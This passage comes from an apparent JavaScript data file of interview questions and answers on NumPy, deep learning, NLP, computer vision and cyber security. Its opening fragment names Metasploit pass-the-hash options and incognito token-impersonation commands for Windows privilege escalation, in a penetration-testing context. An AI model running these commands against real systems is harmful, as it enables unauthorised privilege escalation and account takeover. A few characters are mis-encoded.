cracking - set SMBPass the_hash_value with SMBUser. Token impersonation (use incognito; list_tokens -u; impersonate_token "DOMAIN\\Admin") uses available Windows access tokens for privilege escalation without cracking passwords. Document all findings with screenshots and session logs for the penetration test report.` },
    ],
    numpy: [
      { q:'How does NumPy achieve performance? Explain vectorisation and broadcasting.', hint:'C-backed contiguous memory arrays. Vectorised ops: no Python loops. Broadcasting: implicit shape expansion. BLAS for linear algebra. Avoid Python loops over arrays. dtype matters.', answer:`NumPy stores data in contiguous C arrays - no Python object overhead per element. Operations execute in compiled C/Fortran code (BLAS for linear algebra), bypassing the Python interpreter for each element. Vectorisation means writing operations that apply to the entire array at once: a + b adds two arrays element-wise in C, whereas a Python for-loop pays Python interpreter overhead per element - typically 10-100x slower. Broadcasting allows operations between arrays of compatible but different shapes without copying data: (1000, 3) array + (3,) array broadcasts the 1D array across all 1000 rows implicitly, saving both memory and a Python loop. Rules: dimensions are compared from right to left; a dimension of 1 expands to match the other; incompatible shapes raise an error. Dtype matters for performance and memory: float32 uses half the memory of float64 with lower precision - important for ML workloads where GPU memory is limited. Always prefer vectorised NumPy operations over Python loops. When you find yourself writing for i in range(len(arr)):, there is almost always a NumPy equivalent that is faster.` },
      { q:'Explain NumPy array indexing and slicing including fancy indexing and boolean masks.', hint:'Basic slice: arr[1:5:2]. Multidimensional: arr[0, 1:3]. Boolean mask: arr[arr > 0]. Fancy indexing: arr[[0,2,4]]. np.where. Copies vs views. Modify in place.', answer:`NumPy slicing creates views, not copies - modifying a slice modifies the original. arr[1:5] is a view of rows 1-4; arr[1:5] = 0 zeroes those rows in the original. Basic indexing: arr[row, col] for 2D, arr[1:5, 2:7] selects a 2D subarray. Step slicing: arr[::2] takes every other element. Boolean masking creates a copy: arr[arr > 0] returns elements where the condition is True - arr[arr > 0] = 0 zeroes all positive values in place. This pattern is extremely common for data cleaning. Fancy indexing with integer arrays also creates a copy: arr[[0, 2, 4]] selects rows 0, 2, 4. Combining: arr[arr[:,0] > 5] selects rows where the first column exceeds 5. np.where(condition, x, y) returns x where condition is True, else y - vectorised if-else: np.where(sales > 0, "profit", "loss"). np.argwhere(condition) returns indices of True elements. np.nonzero returns separate arrays of indices per dimension. Understanding copy vs view prevents subtle bugs where you expect to modify a subset in place but are working on a copy.` },
      { q:'How do you perform matrix operations with NumPy?', hint:'np.dot / @ operator for matrix multiply. np.linalg: inv, det, eig, solve, svd. Transpose: .T. Element-wise vs matrix ops. np.matmul. Stacking: vstack, hstack, concatenate. Reshape.', answer:`NumPy provides comprehensive linear algebra. Matrix multiplication: A @ B or np.matmul(A, B) for matrix product (not element-wise). np.dot(a, b) for dot product of vectors or matrix multiply. A * B is element-wise, not matrix multiply - a common error. np.linalg module: np.linalg.inv(A) inverts a square matrix, np.linalg.det(A) computes determinant, np.linalg.solve(A, b) solves Ax = b without inverting (more numerically stable than inv). np.linalg.eig(A) returns eigenvalues and eigenvectors. np.linalg.svd(A) performs Singular Value Decomposition - used in PCA and dimensionality reduction. Transpose: A.T or np.transpose(A) swaps axes. Stacking: np.vstack([a, b]) stacks vertically (row-wise), np.hstack([a, b]) horizontally (column-wise), np.concatenate([a, b], axis=0) is the general form. Reshape: arr.reshape(3, 4) reshapes without copying if possible; arr.ravel() or arr.flatten() creates a 1D array. For machine learning: feature matrices are (n_samples, n_features); weight matrices are (n_features, n_outputs); @ handles the forward pass.` },
      { q:'How do you use NumPy for statistical computations?', hint:'np.mean, median, std, var, percentile, histogram, corrcoef, cov. Axis argument. Aggregation across dimensions. Random: np.random module. Seed for reproducibility. Normal distribution sampling.', answer:`NumPy statistics functions accept an axis argument to compute along specific dimensions. np.mean(arr, axis=0) computes column means (across rows) in a 2D array; axis=1 computes row means. Without axis, it flattens and computes globally. Key functions: np.mean, np.median (median is more robust to outliers), np.std (standard deviation), np.var (variance), np.percentile(arr, [25, 50, 75]) computes quartiles. np.histogram(arr, bins=20) returns bin counts and edges for plotting distributions. np.corrcoef(arr) computes pairwise Pearson correlation coefficients - the correlation matrix. np.cov(arr) computes the covariance matrix. For random number generation: np.random.default_rng(seed=42) creates a reproducible random number generator - always seed for reproducible experiments. rng.normal(mean, std, size) samples from a normal distribution. rng.choice(n, size, replace=False) samples without replacement. rng.shuffle(arr) shuffles in place. rng.integers(low, high, size) generates random integers. For machine learning: use rng for train/test splits, weight initialisation, and data augmentation.` },
      { q:'How do NumPy and Pandas interoperate? What are the performance trade-offs?', hint:'Pandas Series/DataFrame built on NumPy arrays. .values or .to_numpy() extracts NumPy array. Pass NumPy to scikit-learn. NumPy faster for pure numerical; Pandas for labelled heterogeneous data. Memory layout: C vs Fortran order.', answer:`Pandas DataFrames and Series store their data in NumPy arrays internally - a DataFrame is essentially a dict of NumPy arrays sharing an index. Extracting NumPy from Pandas: df['revenue'].to_numpy() or df['revenue'].values returns the underlying NumPy array (to_numpy() is preferred for clarity and handles nullable dtypes). df.to_numpy() extracts the entire DataFrame as a 2D array. For scikit-learn: most estimators accept either Pandas DataFrames or NumPy arrays - internally they call np.asarray() on the input. Performance trade-offs: NumPy is faster for pure numerical operations on homogeneous data because there is no index overhead, no dtype-per-column tracking, and operations avoid Pandas copy-on-write semantics. Use NumPy directly in numerical algorithms (neural network layers, matrix operations, signal processing). Use Pandas for data manipulation that benefits from labels, mixed dtypes, and SQL-like operations. Memory layout: NumPy defaults to C order (row-major, consecutive rows in memory) - matrix operations that iterate rows benefit; Fortran order (F-contiguous) benefits column operations. np.asfortranarray(arr) converts.` },
      { q:'How do you handle missing values and data cleaning with NumPy?', hint:'NaN propagation in floats. np.isnan(), np.nan_to_num(). nanmean, nansum, nanstd. Boolean masking to filter NaNs. Structured arrays for record data. np.unique for deduplication.', answer:`NumPy represents missing float data as NaN (Not a Number). NaN propagates through arithmetic: NaN + 1 = NaN. np.isnan(arr) creates a boolean mask identifying NaN positions. np.nan_to_num(arr, nan=0.0) replaces NaN with a fill value. NaN-aware aggregations skip NaN instead of propagating: np.nanmean(arr), np.nansum(arr), np.nanstd(arr), np.nanpercentile(arr, 50). Filtering NaN rows: arr[~np.isnan(arr).any(axis=1)] removes rows containing any NaN. For integer arrays, NumPy has no native NaN (integers cannot represent NaN) - missing integer data requires using a float array or masked arrays: np.ma.masked_array(data, mask=np.isnan(data.astype(float))). Masking operations on masked arrays propagate the mask through computations. np.unique(arr) returns sorted unique values with optional return_counts=True for frequency counts - useful for cardinality checking and deduplication. np.sort and np.argsort sort arrays and return sort indices for indirect sorting. np.clip(arr, min_val, max_val) clips values to a range - useful for outlier handling without removing rows.` },
    ],
    'deep learning': [
      { q:'What is deep learning and how does it differ from classical machine learning?', hint:'DL: multi-layer neural networks, learns features automatically. ML: manual feature engineering + algorithm. DL needs large data and compute. ML interpretable. DL excels: images, text, speech. Gradient descent, backpropagation.', answer:`Deep Learning uses neural networks with many layers (deep architectures) to learn hierarchical representations of data automatically. Classical ML requires domain experts to manually engineer features from raw data (pixel statistics, TF-IDF, n-grams), then train a model on those features. Deep learning learns the feature extractor and the classifier end-to-end from raw data. A CNN for image classification learns low-level edge detectors, mid-level texture patterns, and high-level object parts through successive layers without any manual feature definition. Deep learning excels where: raw inputs are high-dimensional (images, audio, text), sufficient labeled data exists (thousands to millions of examples), compute is available (GPUs/TPUs). It underperforms classical ML when: data is small (a Random Forest with engineered features beats a neural network on 1,000 examples), interpretability is required, or training cost is prohibitive. Backpropagation computes gradients of the loss with respect to all parameters via the chain rule. Gradient descent updates parameters to minimise loss. Modern frameworks (TensorFlow, PyTorch) handle automatic differentiation, abstracting manual gradient computation.` },
      { q:'Explain convolutional neural networks (CNNs). How do they work for image tasks?', hint:'Conv layer: filters slide over input, learn local features. Max pooling: spatial downsampling. Feature maps. ReLU activation. Fully connected final layers. ImageNet architectures: VGG, ResNet, EfficientNet. Transfer learning.', answer:`CNNs exploit spatial locality in images - nearby pixels are more related than distant ones. A convolutional layer applies a learned filter (kernel) across the spatial dimensions of the input, computing a dot product at each position. Multiple filters produce multiple feature maps - each filter learns to detect a different pattern (edge orientation, colour blob, texture). Padding preserves spatial size; stride controls downsampling. Key architectural components: Conv + BatchNorm + ReLU as the fundamental building block. Max Pooling reduces spatial dimensions by taking the maximum in each 2x2 region, creating translation invariance. Flatten + Dense layers at the end produce class probabilities. Classic architectures: VGG (simple, deep stacks of 3x3 convolutions), ResNet (residual connections skip layers to solve vanishing gradients - enables training of 100+ layer networks), EfficientNet (compound scaling of width/depth/resolution with neural architecture search). Transfer learning is the dominant practice: load a ResNet-50 pretrained on ImageNet (1.2M images, 1000 classes), replace the final classification head with your domain head (10 disease classes), and fine-tune on your small dataset (1,000 medical images). The pretrained features transfer effectively to new domains.` },
      { q:'How do transformer models work? Explain self-attention.', hint:'Self-attention: each token attends to all others. Query/Key/Value matrices. Scaled dot-product attention. Multi-head attention. Positional encoding. BERT (encoder), GPT (decoder), T5 (encoder-decoder).', answer:`Transformers replaced RNNs for sequence modelling by enabling parallel computation through self-attention. Self-attention allows each token in a sequence to attend to all other tokens, capturing long-range dependencies that RNNs struggled with. Mechanism: for each token, compute Query, Key, and Value vectors by multiplying the token embedding by learned weight matrices. Attention score between token i and token j is dot(Q_i, K_j) / sqrt(d_k) - scaled to prevent gradient vanishing in high dimensions. Softmax normalises scores to probabilities. The output is a weighted sum of Value vectors. Multi-Head Attention runs several attention operations in parallel (each "head" learns different relationship types) and concatenates the results. Positional encoding adds position information since attention has no inherent ordering. BERT (encoder-only) is trained with masked language modelling - predict masked tokens - creating contextual embeddings used for NLP classification, NER, QA. GPT (decoder-only) predicts the next token - the basis for language generation. T5 (encoder-decoder) translates input sequences to output sequences (translation, summarisation, QA as text-to-text). Modern LLMs (GPT-4, Claude, Gemini) are scaled-up transformer decoders with billions of parameters.` },
      { q:'What is transfer learning and fine-tuning? How do you apply them in practice?', hint:'Pretrained model: weights from large dataset. Fine-tune: update all weights on small dataset. Feature extraction: freeze pretrained, train only head. Few-shot: prompt engineering. Hugging Face transformers. Learning rate scheduling.', answer:`Transfer learning leverages representations learned on large datasets (ImageNet for vision, BooksCorpus/Wikipedia for language) for new tasks with less data. Two strategies: Feature Extraction freezes the pretrained weights and trains only a new classification head on top. Fast, requires very little data, but cannot adapt the representations to the new domain. Fine-tuning updates all weights (or later layers) on the target dataset - the pretrained weights are a warm start rather than fixed. Better results but needs more data and computation to avoid overfitting. Practical approach for image classification: load ResNet-50 with pretrained=True, replace the final layer, freeze all layers, train the head for 5 epochs, then unfreeze the whole network and fine-tune at a very low learning rate (1e-5) to preserve pretrained representations. For NLP with Hugging Face: from transformers import AutoModelForSequenceClassification, AutoTokenizer - load BERT, add a classification head, fine-tune with AdamW at 2e-5. Learning rate warmup + cosine decay prevents destroying pretrained weights early in training. Few-shot learning via prompt engineering uses a pre-trained LLM with task-specific examples in the prompt, requiring no weight updates - increasingly practical with large language models.` },
      { q:'What are common deep learning training challenges and how do you address them?', hint:'Overfitting: dropout, regularisation, data augmentation, early stopping. Vanishing gradients: ReLU, BatchNorm, residual connections. Exploding gradients: gradient clipping. Learning rate: schedulers, warm-up. Batch size trade-offs.', answer:`Deep learning training challenges span data, architecture, and optimisation. Overfitting (model memorises training data, fails to generalise): Dropout randomly zeros neurons during training, forcing redundant representations. L2 regularisation penalises large weights. Data augmentation (random flips, crops, colour jitter for images; synonym replacement, back-translation for text) artificially expands the dataset. Early stopping monitors validation loss and halts training when it stops improving. Vanishing gradients (gradients become negligibly small in early layers, preventing learning): ReLU activation avoids saturation unlike sigmoid/tanh. Batch Normalisation normalises layer inputs, stabilising training. Residual connections let gradients flow directly through skip connections. Exploding gradients (gradients become extremely large): gradient clipping caps the gradient norm (clip_value=1.0) before the update step. Learning rate is the most critical hyperparameter: too high - loss oscillates; too low - slow convergence. Learning rate schedulers (cosine annealing, ReduceLROnPlateau) adapt the rate during training. Warmup gradually increases LR from 0 to target over the first few hundred steps, preventing instability with pre-trained models. Large batches converge faster but generalise worse (sharp minima); small batches are noisy but generalise better.` },
      { q:'Explain the difference between PyTorch and TensorFlow. How do you choose?', hint:'PyTorch: dynamic computation graph (define-by-run), Pythonic, dominant in research. TensorFlow: static graph (define-then-run) originally, Keras API, better production serving. TF Lite, TF.js for deployment. ONNX for interoperability.', answer:`PyTorch and TensorFlow are both capable deep learning frameworks, but with different design philosophies. PyTorch uses dynamic computation graphs - the graph is built as Python code executes, making it intuitive to debug (standard Python debugger works, print tensors at any point) and flexible for architectures with varying structures (dynamic RNNs, graph neural networks). PyTorch dominates academic research and is increasingly dominant in industry. TensorFlow originally used static computation graphs (define the graph, then feed data through it) - better for optimisation but harder to debug. TensorFlow 2.0 with eager execution largely closed this gap. Keras is TensorFlow high-level API - cleaner for standard architectures. TensorFlow has better production deployment tooling: TensorFlow Serving for REST inference, TF Lite for mobile/edge, TF.js for browser deployment, and TensorFlow Extended (TFX) for ML pipelines. ONNX provides a common format to export models from either framework and deploy with ONNX Runtime. I choose PyTorch for research, experimentation, and custom architectures. I choose TensorFlow/Keras for projects where production deployment to mobile or browser is a primary requirement, or when the team is already familiar with the Keras API.` },
      { q:'How do you evaluate and deploy a deep learning model?', hint:'Metrics: accuracy, F1, AUC-ROC, MSE by task. Confusion matrix. Validation vs test set. Model calibration. Deployment: ONNX, TorchScript, TF SavedModel. Serving: Triton, TorchServe, FastAPI. Monitoring: data drift, model drift.', answer:`Deep learning model evaluation starts with task-appropriate metrics. Classification: accuracy (misleading for imbalanced classes), F1-score (balances precision and recall), AUC-ROC (threshold-independent ranking quality), confusion matrix for per-class performance. Multi-class: macro vs weighted averages. Regression: MAE, RMSE, R-squared. Object detection: mAP (mean Average Precision). Text generation: perplexity, BLEU, ROUGE. Critically, always evaluate on a held-out test set (never the validation set used for hyperparameter tuning). Model calibration: a model predicting "90% confident" should be correct 90% of the time - Platt scaling or temperature scaling calibrates probabilities. Deployment: TorchScript or ONNX export freezes the model for production inference without Python overhead. TorchServe and NVIDIA Triton Inference Server serve multiple models with batching, GPU utilisation optimisation, and A/B testing. For smaller deployments, wrap with FastAPI: load the model once at startup, accept requests, return predictions. Quantisation (INT8) reduces model size and improves inference speed 2-4x with minimal accuracy loss. Post-deployment monitoring: track input data distribution (data drift) and model prediction distribution (concept drift) - degrading accuracy in production requires retraining.` },
    ],
    nlp: [
      { q:'What is NLP and what are its core tasks? Walk through the NLP pipeline.', hint:'NLP: computers understanding human language. Tasks: tokenisation, POS tagging, NER, sentiment analysis, text classification, summarisation, QA, translation. Pipeline: raw text -> tokens -> features -> model -> output.', answer:`NLP (Natural Language Processing) enables computers to understand, interpret, and generate human language. Core tasks: Tokenisation splits text into tokens (words, subwords, characters). POS Tagging assigns grammatical roles (noun, verb, adjective). Named Entity Recognition (NER) identifies entities (person names, organisations, locations, dates). Sentiment Analysis classifies text as positive/negative/neutral. Text Classification categorises documents into predefined labels (spam detection, topic classification). Text Summarisation condenses long documents. Question Answering extracts or generates answers from context. Machine Translation converts between languages. NLP pipeline: raw text -> preprocessing (lowercase, remove punctuation, strip HTML) -> tokenisation -> feature representation (bag-of-words, TF-IDF, or transformer embeddings) -> model (classifier, sequence tagger, generative model) -> post-processing -> output. Modern transformers (BERT, RoBERTa, GPT) have replaced most of this pipeline for high-quality tasks - the pretrained model handles tokenisation (subword with WordPiece or BPE), context-aware embeddings, and task-specific fine-tuning in one end-to-end system.` },
      { q:'Explain text representation: bag-of-words, TF-IDF, and word embeddings.', hint:'BoW: term frequency vector, ignores order. TF-IDF: weighs rare terms higher. Word2Vec/GloVe: dense vectors, semantic similarity. Contextual embeddings: BERT. Cosine similarity. Vocabulary size vs dimensionality.', answer:`Text representation determines what information the model sees. Bag-of-Words creates a sparse vector of term frequencies - each dimension corresponds to a vocabulary word. A document with the word "machine" 3 times has 3 in that dimension. Problems: ignores word order (bag-of-words!), treats all words equally, produces very high-dimensional sparse vectors. TF-IDF (Term Frequency-Inverse Document Frequency) weights terms by their frequency in the document divided by their frequency across all documents. Common words like "the" have near-zero IDF weight; rare, informative words like "convolutional" have high IDF weight. Still sparse and order-insensitive but better for information retrieval. Word Embeddings (Word2Vec, GloVe) represent each word as a dense 100-300 dimensional vector where semantically similar words cluster in the embedding space: king - man + woman ~ queen. These are static embeddings - "bank" has the same vector regardless of context (river bank vs financial bank). Contextual Embeddings (BERT): each word has a different vector depending on its context - the full sentence is encoded by the transformer, producing context-aware representations. Cosine similarity measures semantic similarity between embedding vectors: similar(v1, v2) = dot(v1, v2) / (norm(v1) * norm(v2)).` },
      { q:'How do you fine-tune a transformer model for NLP tasks using Hugging Face?', hint:'from transformers import AutoModel, AutoTokenizer, Trainer, TrainingArguments. Tokenise with padding/truncation. Dataset: datasets library. Training loop or Trainer API. PEFT/LoRA for efficient fine-tuning.', answer:`Hugging Face Transformers is the standard library for transformer-based NLP. For text classification: from transformers import AutoModelForSequenceClassification, AutoTokenizer. Load a pretrained model: model = AutoModelForSequenceClassification.from_pretrained("bert-base-uncased", num_labels=2) and tokeniser: tokenizer = AutoTokenizer.from_pretrained("bert-base-uncased"). Tokenise your dataset: inputs = tokenizer(texts, padding=True, truncation=True, max_length=512, return_tensors="pt") - padding/truncation handles variable-length inputs; max_length=512 is BERT limit. The Hugging Face datasets library loads and preprocesses datasets efficiently: dataset = load_dataset("imdb"). TrainingArguments configures training: num_train_epochs, per_device_train_batch_size, learning_rate=2e-5, warmup_steps. Trainer orchestrates training with evaluation: trainer = Trainer(model, training_args, train_dataset, eval_dataset, compute_metrics). For large models, PEFT (Parameter-Efficient Fine-Tuning) with LoRA freezes most parameters and trains only low-rank adapter matrices - achieves fine-tuning quality with 1/100th the trainable parameters, fitting on a single GPU. Pushing to Hugging Face Hub makes models publicly accessible.` },
      { q:'How do you build a text classification or sentiment analysis system?', hint:'Data: labelled corpus. Preprocessing: clean, tokenise. Model: fine-tuned transformer or sklearn TF-IDF + LogReg for baseline. Evaluation: accuracy, F1, confusion matrix. Deployment: FastAPI + model. Class imbalance handling.', answer:`Building a text classification system: Step 1 - Establish a baseline with traditional ML: sklearn pipeline with TF-IDF (TfidfVectorizer, max_features=50000, ngram_range=(1,2)) + Logistic Regression or LinearSVC. Surprisingly competitive for many tasks and trains in seconds. Step 2 - Beat the baseline with a fine-tuned transformer (BERT, DistilBERT for speed, RoBERTa for quality). DistilBERT is 40% smaller, 60% faster, and retains 97% of BERT performance - the practical choice for production. Data preprocessing for transformers is minimal - avoid aggressive cleaning that removes signal (emoticons matter for sentiment, casing matters for NER). Handle class imbalance: compute class_weight="balanced" in sklearn, or use oversampling (SMOTE on embeddings) or weighted loss in PyTorch: nn.CrossEntropyLoss(weight=class_weights). Evaluation: for binary classification, F1-score is more meaningful than accuracy with imbalanced classes. For multi-class, report per-class F1 and identify which classes are hardest. Deployment: save the model (model.save_pretrained("./my_model")), load at API startup, and expose a FastAPI endpoint. Cache the tokeniser and model as module-level globals - reinitialising per request is 100x slower.` },
      { q:'What is named entity recognition (NER) and how do you build an NER system?', hint:'NER: identify and classify entities (PERSON, ORG, LOC, DATE). IOB tagging. Pretrained NER: spaCy, Hugging Face. Custom training: annotate data with Label Studio. BERT-CRF architecture. Evaluation: entity-level F1.', answer:`NER identifies and classifies named entities in text: [Google](ORG) was founded by [Larry Page](PERSON) in [1998](DATE) in [California](GPE). Standard entity types: PERSON, ORG, GPE (geopolitical entity), LOC, DATE, MONEY, PERCENT. NER is formulated as sequence labelling using IOB (Inside-Outside-Beginning) tagging: each token is labelled B-PERSON (beginning of a person entity), I-PERSON (inside), or O (outside an entity). For pre-built NER, spaCy provides high-quality English NER with ner = nlp("Apple is headquartered in Cupertino") and ent.text, ent.label_ for each entity. Hugging Face pipeline("ner", model="dslim/bert-base-NER") offers transformer-based NER. For custom entities (medical drugs, legal clauses, product names): annotate 500-1000 examples with Label Studio, fine-tune a token classification model (AutoModelForTokenClassification) on the annotated data. The BERT-CRF architecture adds a Conditional Random Field layer on top of BERT to enforce valid IOB transitions - slightly better F1 for strict entity extraction. Evaluation uses entity-level F1 (strict match requires both boundaries and type to be correct, not just token-level accuracy).` },
    ],
    'computer vision': [
      { q:'What are the core tasks in computer vision? Describe image classification, object detection, and segmentation.', hint:'Classification: one label per image. Detection: bounding boxes + labels. Segmentation: semantic (pixel class) vs instance (individual object). Keypoint detection. Video: temporal dimension. Datasets: ImageNet, COCO, PASCAL VOC.', answer:`Computer Vision enables computers to interpret visual data. Core tasks at increasing granularity: Image Classification assigns one label to the entire image ("cat", "dog") - the ImageNet challenge drove deep learning breakthroughs. Object Detection locates and classifies multiple objects with bounding boxes (YOLO, Faster R-CNN) - input: image; output: list of (class, confidence, x, y, width, height). Semantic Segmentation assigns a class label to every pixel - all pixels belonging to "road" get the same label, no distinction between individual road segments (DeepLab, SegNet). Instance Segmentation combines detection and segmentation - each object instance gets its own mask even if two objects have the same class (Mask R-CNN). Panoptic Segmentation unifies semantic and instance segmentation. Pose Estimation locates human body keypoints (joints) for gesture recognition and sports analytics. Video Understanding adds the temporal dimension - action recognition, object tracking, video captioning. Standard benchmarks: ImageNet (1.2M images, 1000 classes) for classification, COCO (328K images with object detection and segmentation annotations), PASCAL VOC for multi-class detection.` },
      { q:'How does YOLO work for real-time object detection?', hint:'Single-pass detection: divides image into grid. Each cell predicts bounding boxes + confidence + class. Anchor boxes. Non-max suppression. YOLOv8/v9: feature pyramid network, attention. Speed vs accuracy trade-off.', answer:`YOLO (You Only Look Once) performs object detection in a single forward pass through the network - dramatically faster than two-stage detectors (Faster R-CNN) which first propose regions then classify. YOLO divides the input image into an SÃ—S grid. Each cell predicts B bounding boxes (with x, y, width, height offsets from the cell and a confidence score) and C class probabilities. Anchor boxes are predefined bounding box shapes based on the dataset statistics - boxes predict offsets from anchors rather than absolute coordinates, making training more stable. Feature Pyramid Network (FPN) combines feature maps from multiple scales (small feature maps = large receptive field = large objects; large feature maps = small receptive field = small objects) enabling detection across scale. Non-Maximum Suppression removes duplicate detections: among overlapping boxes above confidence threshold, keep only the highest confidence box. YOLOv8 (Ultralytics) is the current practical standard - easy API: from ultralytics import YOLO; model = YOLO("yolov8n.pt"); results = model("image.jpg"). Models range from nano (fast, less accurate) to xlarge (slower, most accurate). For real-time applications (security cameras, autonomous vehicles), YOLOv8n achieves 30+ FPS on a single GPU.` },
      { q:'How do you handle data augmentation for computer vision?', hint:'Augmentation: artificially expand dataset, improve generalisation. Basic: flip, crop, rotate, colour jitter. Advanced: CutOut, MixUp, CutMix, RandAugment. albumentations library. Augmentation during training only. Test-time augmentation.', answer:`Data augmentation creates new training examples by applying label-preserving transformations to existing images, improving generalisation. Basic augmentations: horizontal flip (valid for most objects, not for handwriting recognition), random crop (random size and aspect ratio, then resize to target), colour jitter (randomly adjust brightness, contrast, saturation, hue), random rotation (±15 degrees), Gaussian blur, random erasing. albumentations is the standard Python library - significantly faster than torchvision transforms and supports bounding box, keypoint, and mask transformations consistently with the image. A typical pipeline: A.Compose([A.HorizontalFlip(p=0.5), A.RandomBrightnessContrast(p=0.2), A.ShiftScaleRotate(p=0.3), A.Normalize()]). Advanced augmentation for improved generalisation: MixUp blends two images and their labels linearly (new_img = Î»*img1 + (1-Î»)*img2). CutMix cuts a patch from one image and pastes into another with proportional label mixing. RandAugment randomly selects and applies a sequence of augmentations from a fixed set with random magnitude - automates augmentation policy selection. Test-time augmentation applies augmentations at inference (flip, crop variants) and averages predictions across augmented versions for better accuracy at inference cost.` },
      { q:'How do you implement a computer vision pipeline end-to-end?', hint:'Data collection and labelling. Preprocessing: resize, normalise. Model selection: pretrained CNN. Training: GPU, mixed precision. Evaluation: mAP for detection, IoU. Deployment: ONNX, TensorRT for GPU acceleration. Edge: TF Lite, OpenVINO.', answer:`End-to-end computer vision pipeline: Data Collection - gather images representative of production conditions (same camera, same lighting). Data Labelling - LabelImg for bounding boxes (detection), Label Studio for segmentation and classification. The annotation quality ceiling limits model ceiling - invest in clear labelling guidelines. Data preprocessing: standardise image size (224x224 for classification, 640x640 for YOLO detection), normalise to ImageNet mean and std ([0.485, 0.456, 0.406], [0.229, 0.224, 0.225]) for pretrained models. Model selection: EfficientNet-B0 for classification (small, accurate), YOLOv8 for detection, SegFormer for segmentation. Training: use GPU with mixed precision (AMP): scaler = torch.cuda.amp.GradScaler() reduces memory and speeds training. Monitor training loss, validation mAP, and sample predictions every epoch to catch overfitting or data issues. Evaluation: mAP@0.5 (mean Average Precision at 50% IoU threshold) for detection; pixel accuracy and mIoU for segmentation; Confusion matrix for classification. Deployment: export to ONNX then convert to TensorRT for 3-10x GPU inference speedup. Edge deployment: convert to TFLite (mobile) or OpenVINO (Intel hardware) for CPU inference at 20-30 FPS.` },
    ],
    'cyber security': [
      { q:'What is the cyber security kill chain and how do defenders use it?', hint:'Lockheed Martin Kill Chain: Reconnaissance, Weaponisation, Delivery, Exploitation, Installation, C2, Actions on Objectives. Defenders: detect and disrupt early stages. MITRE ATT&CK more granular. Defence in depth.', answer:`The Cyber Kill Chain (Lockheed Martin) models the stages of a targeted cyber attack. Reconnaissance: attacker gathers information about the target (OSINT, DNS enumeration, LinkedIn scraping). Weaponisation: creates an exploit payload (malicious PDF, phishing email with macro). Delivery: delivers the weapon to the target (phishing email, watering hole, USB drop). Exploitation: triggers the exploit to execute malicious code. Installation: installs a persistent backdoor or RAT. Command and Control (C2): establishes a communication channel to the attacker infrastructure. Actions on Objectives: achieves the goal (data exfiltration, ransomware deployment, lateral movement). Defenders use the kill chain to identify which defensive controls disrupt which stages - denying Delivery (email filtering) is more effective than responding to C2 that has already been established. MITRE ATT&CK is the modern, more granular framework mapping 14 tactics (Initial Access, Execution, Persistence, Privilege Escalation, Defence Evasion, Credential Access, Discovery, Lateral Movement, Collection, C2, Exfiltration, Impact) with hundreds of specific techniques and sub-techniques, each with detection and mitigation guidance. Defence in depth deploys controls at every stage so that bypassing one does not mean bypassing all.` },
      { q:'What is the OWASP Top 10 and how do you defend against each category?', hint:'2021: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Auth Failures, Software/Data Integrity, Logging Failures, SSRF. Each has specific controls.', answer:`OWASP Top 10 (2021 edition) are the most critical web application security risks. A01 Broken Access Control (moved to #1): enforce authorisation server-side on every request, deny by default, use RBAC/ABAC - never rely on UI hiding to enforce access control. A02 Cryptographic Failures: use TLS 1.2+, strong hashing (bcrypt/Argon2 for passwords, not MD5/SHA1), encrypt sensitive data at rest. A03 Injection (SQL, LDAP, OS): use parameterised queries, ORMs, input validation - never concatenate user input into queries or commands. A04 Insecure Design: threat modelling during design phase, secure design patterns, abuse case testing. A05 Security Misconfiguration: disable default accounts, remove unnecessary features, use security headers (CSP, HSTS, X-Frame-Options), automated configuration scanning. A06 Vulnerable and Outdated Components: Dependency scanning (Snyk, OWASP Dependency-Check), automated patch management. A07 Authentication and Identification Failures: MFA, strong password policies, account lockout, secure session management. A08 Software and Data Integrity Failures: code signing, verify dependencies, CI/CD pipeline security. A09 Logging and Monitoring Failures: log authentication events, implement alerting, test incident response. A10 SSRF: validate and sanitise URLs, deny internal network access from user-supplied URLs, use allowlists.` },
      { q:'How does identity and access management (IAM) work in an enterprise?', hint:'Authentication: who are you? Authorisation: what can you do? MFA, SSO, SAML, OAuth2/OIDC. RBAC/ABAC. Privileged access management (PAM). Zero trust: never trust, always verify. JIT access.', answer:`IAM governs digital identity and access across the enterprise. Authentication verifies identity - passwords, MFA (TOTP, hardware keys, push notifications), biometrics, certificates. Single Sign-On (SSO) uses SAML 2.0 or OIDC to allow one login to access multiple applications - the Identity Provider (Okta, Azure AD, Ping) authenticates the user and issues a signed assertion/token that service providers trust without the user re-entering credentials. Authorisation determines what authenticated users can do. Role-Based Access Control (RBAC) assigns permissions to roles, then users to roles - maintainable and auditable. Attribute-Based Access Control (ABAC) evaluates access based on user attributes, resource attributes, and environment conditions - more flexible for complex policies. Privileged Access Management (PAM) specifically manages high-privilege accounts (domain admins, root, DBA) - CyberArk and BeyondTrust vault credentials, record sessions, and enforce checkout/approval for privileged access. Just-In-Time (JIT) access grants elevated permissions only when needed and auto-revokes after a time window. Zero Trust Network Access replaces the "trusted internal network" model with "verify every request regardless of origin" - authenticate and authorise every connection to every resource, even internal ones. Micro-segmentation limits blast radius when an account is compromised.` },
      { q:'What is penetration testing? Describe the phases and methodology.', hint:'Pentest: authorised attack simulation. Phases: scoping, reconnaissance, scanning/enumeration, exploitation, post-exploitation, reporting. Rules of engagement. Black/white/grey box. PTES, OWASP testing guide.', answer:`Penetration Testing is authorised simulation of cyber attacks to identify security weaknesses before real attackers do. A pentest always starts with a signed Scope of Work and Rules of Engagement - defining target systems, allowed attack techniques, testing windows, and emergency contacts. Phases: Scoping defines what is in-scope (specific IP ranges, applications, cloud accounts) and what is explicitly out of scope (production databases during business hours). Reconnaissance gathers information about the target using OSINT (LinkedIn, DNS, public code repositories, Shodan) without touching the target systems. Scanning and Enumeration actively probes in-scope systems: Nmap port scans, service version detection, vulnerability scanning with Nessus/OpenVAS, web application crawling. Exploitation attempts to validate vulnerabilities by exploiting them (with care to avoid data destruction): gaining unauthorised access, escalating privileges. Post-Exploitation demonstrates business impact: what data is accessible, what systems can be reached from the foothold, what is the blast radius. Reporting documents findings with severity ratings (CVSS scores), evidence (screenshots, tool output), business impact, and specific remediation steps. Test types: Black Box (no prior knowledge - simulates external attacker), White Box (full knowledge of architecture and code - most thorough), Grey Box (partial knowledge - simulates insider or account takeover scenario).` },
